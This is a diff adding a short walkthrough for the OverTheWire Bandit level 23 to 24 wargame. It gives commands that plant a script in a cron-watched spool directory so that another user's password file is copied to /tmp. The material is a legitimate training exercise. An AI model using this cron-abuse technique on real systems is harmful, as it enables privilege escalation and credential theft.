@@ -1,0 +1,21 @@
+OverTheWire Bandit: Level 23 → 24
+
+Objective
+Obtain the password for Level 24.
+A cron job executes scripts placed in a specific directory. Any executable script placed there will run automatically.
+
+Steps
+Log in as bandit23:
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+Review the cron job configuration:
+cat /etc/cron.d/cronjob_bandit24
+Inspect the executed script:
+cat /usr/bin/cronjob_bandit24.sh
+Create a script that copies the password to a readable location:
+echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass" > /var/spool/bandit24/foo.sh
+chmod +x /var/spool/bandit24/foo.sh
+Wait for the cron job to run, then read the file:
+cat /tmp/bandit24_pass
+
+Result
+The file contains the password for Bandit Level 24.
